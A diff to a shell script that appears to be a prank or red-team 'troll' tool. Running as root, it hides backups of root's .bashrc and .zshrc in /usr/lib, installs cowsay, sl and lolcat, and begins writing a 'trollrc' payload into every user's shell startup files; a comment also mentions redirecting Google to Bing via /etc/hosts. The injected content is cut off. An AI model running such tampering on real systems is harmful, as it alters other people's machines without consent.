@@ -11,34 +11,41 @@
 # --- /etc/hosts
 # Redirect all Google queries to Bing
 
-echo "[+] --- Trolling '.bashrc' and '.zshrc' for all users"
-
 # First make a good .bashrc that I can source when logging in
+
+echo "[+] --- Backing up '.bashrc' and '.zshrc'"
+
 if [ -f "/root/.bashrc" ] && ! grep -q "Please wait" "/root/.bashrc"; then
-	if ! cp "/root/.bashrc" "/usr/lib/.bashrc.bak" && echo "[*] Backed up original bashrc to '/usr/lib/.bashrc.bak'"; then
+	if ! cp "/root/.bashrc" "/usr/lib/.bashrc.bak"; then
 		echo "[!] Could not back up original bashrc, exiting"
 		exit 1
+	else
+		echo "[*] Backed up original bashrc to '/usr/lib/.bashrc.bak'"
 	fi
 fi
 if [ -f "/root/.zshrc" ] && ! grep -q "Please wait" "/root/.zshrc"; then
-	if ! cp "/root/.zshrc" "/usr/lib/.zshrc.bak" && echo "[*] Backed up original zshrc to '/usr/lib/.zshrc.bak'"; then
+	if ! cp "/root/.zshrc" "/usr/lib/.zshrc.bak"; then
 		echo "[!] Could not back up original zshrc, exiting"
 		exit 1
+	else
+		echo "[*] Backed up original zshrc to '/usr/lib/.zshrc.bak'"
 	fi
 fi
+
 
 # Install necessary packages
 install_packages="cowsay sl lolcat"
 
+echo
 if which apt-get &>/dev/null; then
-	echo "[*] Installing packages '$install_packages'"
+	echo "[+] --- Installing packages '$install_packages'"
 	if ! apt-get install -y $install_packages; then
 		echo "[!] Could not install packages"
 	else
 		echo "[=] Packages installed"
 	fi
 elif which yum &>/dev/null; then
-	echo "[*] Installing packages '$install_packages'"
+	echo "[+] --- Installing packages '$install_packages'"
 	if ! yum install -y $install_packages; then
 		echo "[!] Could not install packages"
 	else
@@ -47,6 +54,9 @@ elif which yum &>/dev/null; then
 else
 	echo "[!] No compatible package managers detected: couldn't install '$install_packages'"
 fi
+
+echo
+echo "[+] --- Trolling '.bashrc' and '.zshrc' for all users"
 
 trollrc='
 echo "Please wait..."
